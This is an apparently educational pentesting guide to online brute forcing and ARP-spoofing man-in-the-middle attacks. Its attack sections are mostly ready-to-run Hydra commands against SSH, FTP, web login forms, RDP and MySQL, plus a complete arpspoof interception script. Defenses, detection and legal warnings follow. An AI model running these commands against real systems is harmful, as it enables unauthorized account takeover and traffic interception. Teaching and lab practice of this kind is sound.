# Online Brute Forcing

Learn brute force attack techniques for **ethical pentesting in authorized lab environments only**.

---

## ⚠️ **CRITICAL LEGAL WARNING**

**This guide is for AUTHORIZED TESTING ONLY!**

✅ **Legal Use:**
- Your own systems in lab environments
- Authorized penetration tests with written permission
- Educational CTF/lab platforms (TryHackMe, HackTheBox)

❌ **ILLEGAL Activities:**
- Attacking systems without written permission
- Testing on production systems without authorization
- Brute forcing websites/services you don't own

**Unauthorized access is a CRIME in most countries. You WILL face criminal charges!**

---

## 📚 Table of Contents

- [What is Brute Forcing?](#what-is-brute-forcing)
- [Hydra - The Tool](#hydra---the-tool)
- [Attack Scenarios](#attack-scenarios)
- [MitM Attacks](#mitm-attacks)
- [Defense Mechanisms](#defense-mechanisms)

---

## What is Brute Forcing?

**Brute forcing** systematically tries many passwords until finding the correct one.

**Types:**
- **Dictionary Attack** - Try common passwords from wordlist
- **Credential Stuffing** - Try leaked username/password pairs
- **Rainbow Tables** - Pre-computed hash attacks (offline)

---

## Hydra - The Tool

**Hydra** is a fast network authentication cracker supporting many protocols.

### Installation

```bash
# Debian/Ubuntu/Kali
sudo apt install hydra

# Check version
hydra -h
```

### Basic Syntax

```bash
# Single username, single password
hydra -l USERNAME -p PASSWORD TARGET SERVICE

# Username list, password list
hydra -L users.txt -P passwords.txt TARGET SERVICE

# Options:
# -l: single username
# -L: username list file
# -p: single password  
# -P: password list file
# -vV: very verbose
# -t: threads (speed)
```

---

## Attack Scenarios

### SSH Brute Force

```bash
# Single user, wordlist
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.0.2.100

# With verbose output
hydra -l admin -P passwords.txt ssh://192.0.2.100 -vV

# Multiple threads (faster, but detectable!)
hydra -l admin -P passwords.txt ssh://192.0.2.100 -t 4

# Example output when successful:
# [22][ssh] host: 192.0.2.100   login: admin   password: password123
```

**Common SSH Usernames:**
```
root
admin
user
administrator
Guest
```

### FTP Brute Force

```bash
# Attack FTP service
hydra -l ftp_user -P passwords.txt ftp://192.0.2.100

# Allow multiple attempts per connection
hydra -l ftp_user -P passwords.txt ftp://192.0.2.100 -t 4
```

### HTTP POST Form

**Web login forms** are common targets:

```bash
# Basic HTTP POST attack
hydra -l admin -P passwords.txt 192.0.2.100 http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"

# Breakdown:
# /login.php - Login page path
# username=^USER^ - Username parameter (^USER^ is placeholder)
# password=^PASS^ - Password parameter (^PASS^ is placeholder)
# F=incorrect - Failure string (text that appears when login fails)
```

**Example with real form:**
```bash
# WordPress login
hydra -l admin -P passwords. txt 192.0.2.100 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=ERROR"

# Custom web app
hydra -l admin -P passwords.txt 192.0.2.100 http-post-form "/auth:user=^USER^&pass=^PASS^&submit=Login:F=Invalid credentials"
```

### HTTP Basic Auth

```bash
# HTTP Basic Authentication
hydra -l admin -P passwords.txt http-get://192.0.2.100/admin/
```

### RDP (Remote Desktop)

```bash
# Attack Windows RDP
hyd

ra -l Administrator -P passwords.txt rdp://192.0.2.100
```

### MySQL Database

```bash
# MySQL brute force
hydra -l root -P passwords.txt mysql://192.0.2.100
```

---

## MitM Attacks

**Man-in-the-Middle (MitM)** attacks intercept network traffic between two parties.

### Prerequisites

1. All systems on same network (local LAN)
2. Attacker machine (Linux)
3. Victim machine
4. Router/Gateway

### Step 1: Enable IP Forwarding

Make your machine act as a router:

```bash
# Enable packet forwarding
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Verify
cat /proc/sys/net/ipv4/ip_forward

# Should output: 1
```

### Step 2: ARP Spoofing (Victim → Router)

Intercept packets from victim to router:

```bash
# Syntax:
# arpspoof -i [INTERFACE] -t [VICTIM_IP] [ROUTER_IP]

# Example:
sudo arpspoof -i eth0 -t 192.0.2.50 192.0.2.1

# This makes victim think YOU are the router
```

### Step 3: ARP Spoofing (Router → Victim)

Intercept packets from router to victim:

```bash
# In a SECOND terminal:
# arpspoof -i [INTERFACE] -t [ROUTER_IP] [VICTIM_IP]

sudo arpspoof -i eth0 -t 192.0.2.1 192.0.2.50

# This makes router think YOU are the victim
```

### Step 4: Capture Traffic

Now you're in the middle - use Wireshark to capture:

```bash
# In a THIRD terminal, capture packets:
sudo wireshark

# Or use tcpdump:
sudo tcpdump -i eth0 -w mitm_capture.pcap
```

### Complete MitM Script

```bash
#!/bin/bash
# mitm_attack.sh - FOR AUTHORIZED LAB TESTING ONLY!

INTERFACE="eth0"
VICTIM_IP="192.0.2.50"
ROUTER_IP="192.0.2.1"

echo "[+] Enabling IP forwarding..."
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

echo "[+] Starting ARP spoofing..."
echo "    Victim → Router"
sudo arpspoof -i $INTERFACE -t $VICTIM_IP $ROUTER_IP &

sleep 2

echo "    Router → Victim"
sudo arpspoof -i $INTERFACE -t $ROUTER_IP $VICTIM_IP &

echo "[+] MitM attack active!"
echo "[+] Capture traffic with Wireshark or tcpdump"
echo "[!] Press Ctrl+C to stop"

# Cleanup on exit
trap cleanup INT
cleanup() {
    echo "[!] Stopping attack..."
    sudo killall arpspoof
    echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward
    exit 0
}

wait
```

---

## Defense Mechanisms

### How to Defend Against Brute Force

**1. Strong Passwords**
```bash
# Minimum requirements:
# - 12+ characters
# - Mix of upper/lowercase
# - Numbers and symbols
# - Not in common wordlists

# Good: "MyD0g!L0ves#Pizza2024"
# Bad: "password123"
```

**2. Account Lockout**
```bash
# Lock account after N failed attempts
# Example: fail2ban configuration

sudo apt install fail2ban

# Edit /etc/fail2ban/jail.local
[sshd]
enabled = true
maxretry = 3
findtime = 600
bantime = 3600
```

**3. Rate Limiting**
```bash
# Limit login attempts per IP
# Use iptables or application-level controls

# Example: Limit SSH connections
iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --set
iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --update --seconds 60 --hitcount 4 -j DROP
```

**4. Two-Factor Authentication (2FA)**
```bash
# Even if password is found, attacker needs 2nd factor
# Use Google Authenticator, YubiKey, etc.

# Install for SSH:
sudo apt install libpam-google-authenticator
google-authenticator

# Edit /etc/pam.d/sshd
# Add: auth required pam_google_authenticator.so
```

**5. Monitor Logs**
```bash
# Watch for brute force attempts
sudo tail -f /var/log/auth.log | grep "Failed password"

# Count failed attempts
sudo grep "Failed password" /var/log/auth.log | wc -l

# See attacking IPs
sudo grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn
```

### Detecting MitM Attacks

**Signs of ARP Spoofing:**
```bash
# Check ARP table for duplicates
arp -a

# Look for same MAC for different IPs
# Normal:
# 192.0.2.1 at aa:bb:cc:dd:ee:ff
# 192.0.2.50 at 11:22:33:44:55:66

# Suspicious (MitM):
# 192.0.2.1 at aa:bb:cc:dd:ee:ff
# 192.0.2.50 at aa:bb:cc:dd:ee:ff  <- SAME MAC!
```

**Use ARP monitoring tools:**
```bash
# Install arpwatch
sudo apt install arpwatch

# Monitor for ARP changes
sudo arpwatch -i eth0
```

---

## Wordlists

### Common Wordlists

```bash
# RockYou (most popular)
/usr/share/wordlists/rockyou.txt

# SecLists
/usr/share/seclists/Passwords/

# Common passwords
/usr/share/wordlists/fasttrack.txt
```

### Download SecLists

```bash
# Install SecLists
sudo apt install seclists

# Or clone from GitHub
git clone https://github.com/danielmiessler/SecLists.git
```

---

## Best Practices for Ethical Testing

### Before Testing

1. ✅ Get **written authorization**
2. ✅ Define **scope** clearly
3. ✅ Use **isolated lab** environment
4. ✅ Document **everything**
5. ✅ Have **incident response** plan

### During Testing

1. ✅ Stay within **defined scope**
2. ✅ Use **appropriate thread counts** (don't DoS!)
3. ✅ **Log all actions**
4. ✅ **Stop immediately** if unauthorized activity detected
5. ✅ Communicate with **stakeholders**

### After Testing

1. ✅ **Report findings** professionally
2. ✅ **Delete all captured data**
3. ✅ **Provide remediation** recommendations
4. ✅ **Verify fixes** if requested

---

## Practice Labs

**Safe, Legal Environments:**

1. **TryHackMe** - https://tryhackme.com/
   - Mr Robot CTF (brute force practice)
   - Hydra Room

2. **HackTheBox** - https://www.hackthebox.com/
   - Many machines with brute force vectors

3. **VulnHub** - https://www.vulnhub.com/
   - Download vulnerable VMs

4. **DVWA** - Damn Vulnerable Web Application
   - Practice web brute forcing safely

---

## Quick Reference

### Hydra Commands

```bash
# SSH
hydra -l admin -P passwords.txt ssh://TARGET

# FTP
hydra -l ftp -P passwords.txt ftp://TARGET

# HTTP POST Form
hydra -l admin -P passwords.txt TARGET http-post-form "PATH:USER=^USER^&PASS=^PASS^:F=fail_string"

# MySQL
hydra -l root -P passwords.txt mysql://TARGET

# RDP
hydra -l Administrator -P passwords.txt rdp://TARGET
```

---

## See Also

- [Offline Brute Forcing](offline-brute-forcing.md) - Hash cracking with John
- [Network Services](network-services.md) - Services you'll attack
- [Text Manipulation](text-manipulation.md) - Process wordlists
